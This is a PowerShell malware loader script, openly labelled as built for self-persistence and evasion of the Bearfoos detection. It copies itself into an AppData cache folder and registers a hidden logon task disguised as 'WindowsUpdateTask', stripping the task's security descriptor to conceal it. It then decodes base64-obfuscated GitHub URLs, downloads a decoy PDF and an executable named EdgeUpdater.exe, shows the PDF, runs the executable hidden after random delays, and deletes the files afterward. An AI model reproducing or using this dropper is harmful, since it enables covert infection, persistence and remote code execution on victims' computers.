# launcher.ps1 - Self-persistence + Bearfoos evasion
$ErrorActionPreference = 'SilentlyContinue'

# === Ensure script is saved to disk ===
$localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
$currentPath = $MyInvocation.MyCommand.Path

# If running from memory or temp location, save ourselves to disk
if (-not $currentPath -or $currentPath -eq $null -or $currentPath -eq "") {
    # We are running from memory (iex download) - capture the script content
    $scriptContent = @'
# (The entire script content - but we can't embed itself easily)
# Instead, re-download and save
'@
    # Simpler: re-download and save to disk
    $rawUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
    $wc = New-Object System.Net.WebClient
    $wc.DownloadString($rawUrl) | Out-File -FilePath $localPath -Encoding UTF8
    $scriptPath = $localPath
} else {
    $scriptPath = $currentPath
    # If we're not already in the cache folder, copy there
    if ($scriptPath -ne $localPath) {
        Copy-Item -Path $scriptPath -Destination $localPath -Force
        $scriptPath = $localPath
    }
}

# === PERSISTENCE: Install once (using Scheduled Task - more reliable) ===
$taskName = "WindowsUpdateTask"
$taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if (-not $taskExists) {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    $trigger = New-ScheduledTaskTrigger -AtLogOn -User (Get-CimInstance -ClassName Win32_ComputerSystem).UserName
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
    # Make task truly hidden by removing SD
    $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
    if (Test-Path $taskPath) {
        Remove-ItemProperty -Path $taskPath -Name "SecurityDescriptor" -Force -ErrorAction SilentlyContinue
    }
}

# === ORIGINAL LOADER (download PDF and EXE, launch with delay) ===
Start-Sleep -Milliseconds (Get-Random -Min 2000 -Max 8000)

$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }

$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
$pdfPath = "$cache\doc.pdf"
$exePath = "$cache\helper.exe"

$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
try { Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing } catch {}
Start-Sleep -Milliseconds (Get-Random -Min 1500 -Max 4000)
try { Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing } catch {}
try { Start-Process $pdfPath } catch {}

Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
try {
    $wsh = New-Object -ComObject WScript.Shell
    $wsh.Run("`"$exePath`"", 0, $false)
} catch {
    Start-Process $exePath -WindowStyle Hidden
}

# Cleanup after 5 minutes
Start-Job -ScriptBlock {
    Start-Sleep -Seconds 300
    Remove-Item -Path $args[0] -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $args[1] -Force -ErrorAction SilentlyContinue
} -ArgumentList $exePath, $pdfPath | Out-Null
